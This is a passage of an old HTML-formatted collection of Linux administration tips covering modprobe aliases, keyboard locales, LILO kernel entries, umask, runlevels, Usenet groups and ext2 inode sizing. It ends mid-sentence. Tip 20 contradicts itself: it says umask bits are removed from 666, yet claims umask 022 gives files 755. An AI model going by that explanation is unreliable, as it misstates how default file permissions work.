><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >modprobe: cannot find net-pf-5</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >modprobe: cannot find char-major-14</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >These are messages from the modules loader telling you that he can't find specific modules. This usualy</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >happens when you compile modules, but modprobe tries to load modules that were not compiled and it can't</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >find them. The way to remove those messages is to set the modules to off. In the file /etc/conf.modules you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >may want to add:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >alias net-pf-5 off</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >alias char-major-14 off</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will stop modprobe from trying to load them. Of course you could also try to resove the problem by</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >compiling the modules and make sure modprobe knows where they are.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.17</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 17: Programs on CD-ROM</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://metalab.unc.edu</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >, </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >ftp://ftp.cdrom.com </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and more are sites with a lot of programs available freely for</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux. But you may not want to download gigabytes of data over a slow Internet link.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Several places offer a bunch of free programs on CD-ROM. </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.cheapbytes.com </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.linuxmall.com </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >are 2 places that can sell multiple CD-ROMs with all those programs for a very</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >low price:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.18</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 18: International console</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Most Linux distributions are configured to use a US english keyboard. If you need to write on a french or any</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >other kind of keyboard, you will want to change the locale so special keys like accents appear in the console.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The way to do this is to change the system locale with a program called loadkeys. For example, to enable a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >canadian-french locale, you need to add this line in your startup files:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >loadkeys cf</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here cf means the canadian-french keyboard. Other locales are us, fr and more.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.19</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 19: Multiple kernels choices</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you compile a new kernel, you will often change your configuration. This means you may forget to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >include an important driver, like the IDE driver, or otherwise make your system unbootable. The solution is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to always keep your old kernel.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you compile your kernel, the compilation procedure will often copy your old kernel into vmlinuz.old.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If it does not, you can do it manually. What you should do is add an entry to /etc/lilo.conf allowing you to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >boot your old kernel. You should view the lilo man page for the complete syntax. You could also add entries</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >for different kernels, for example if you want to have an older stable version of the kernel and the newest</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >development version on your system.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that some distributions name their kernel with the version they represent. For example, your current</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kernel may be /boot/vmlinuz-2.0.36-0.7</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.20</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 20: Default file permissions</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you create a file, the system gives it default permissions. On most systems the permissions are 755</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >(read, write and execute for the owner, and read and execute for others).</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This default is setup with the umask command. To use the command, you need to find the right octal number</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to give it. The permissions in the umask are turned off from 666. This means that a umask of 022 will give</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you the default of 755. To change your default permissions from 755 to 700, you would use this command:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >umask 077</SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.21</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 21: Default boot mode</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When a Linux system boots, it loads the kernel, all its drivers, and the networking servers, then the system</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >will display a text login prompt. There, users can enter their user names and their passwords. But it doesn't</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >have to boot this way.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are 3 modes defined in most Linux distributions that can be used for booting. They are defined in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >/etc/inittab and have specific numbers. The first mode, also called runlevel 1, is single user mode. That mode</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >will only boot the system for 1 user, with no networking. Runlevel 3 is the default mode. It will load the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >networking servers and display a text login prompt. Runlevel 5 is the graphical mode. If you have X Window</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >installed and configured, you can use it to display a graphical login prompt.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The way to change this is to edit /etc/inittab and change the initdefault line:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >id:3:initdefault:</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Changing a 3 to a 5 will make the system display a xdm graphical screen on bootup.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.22</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 22: More information from usenet</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are newsgroups about everything. Newsgroups on the latest TV show, on gardening, and more. There</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >also are newsgroups on Linux. In fact, the best help can be obtained from newsgroups. But which ones?</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here is a list of a few newsgroups dedicated to Linux, and what they are used for:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >comp.os.linux.advocacy: This newsgroup is used for advocacy. People stating their opinions</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >about Linux or Linux applications, and about Linux competitors. Some post facts, some will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >flame other people.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >comp.os.linux.setup: This is a general purpose setup help group. Users will post questions and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >get answers there.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >linux.*: There now is a linux section on usenet. Currently there are more than 150 groups in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >linux.* and they are all about Linux!</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Make sure you read the FAQ and rules of every newsgroup you want to post to.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.23</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 23: Bytes per inodes</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you format a partition using Linux's primary file system, ext2, you have the choice of how many bytes</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >per inode you want. From the man page:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >-i bytes-per-inode</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >Specify the bytes/inode ratio. mke2fs creates an</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >inode for every bytes-per-inode bytes of space on</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >the disk. This value defaults to 4096 bytes.</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >bytes-per-inode must be at least 1024.</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This means that by using a smaller size, you will save disk space but may slow down the system. It is a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >space/speed trade off.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This is similar to one of FAT16/FAT32' major differences.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.24</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 24: LILO and boot problems</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When a computer starts, the number of beeps the BIOS outputs tells you the state of the computer. On some</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >computers, one beep means all is ok, but 2 beeps mean there is an error. LILO uses the same kind of codes.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The number of letters you see from the word LILO on the screen says what is wrong. The whole word means</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >everything is fine, only LI means only the first part of LILO could be loaded. A full description of this is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >available from the Bootdisk HOWTO.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When LILO can't load, it's a major problem. This often means that the boot code was corrupted. The only</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >way to boot is from a floppy disk. In RedHat, you can use the rescue disk, in Slackware, you can use the boot</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >disk with the "mount" image.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When LILO is fine, it's often easier to figure a boot problem. If the kernel panics when it tries to boot, it 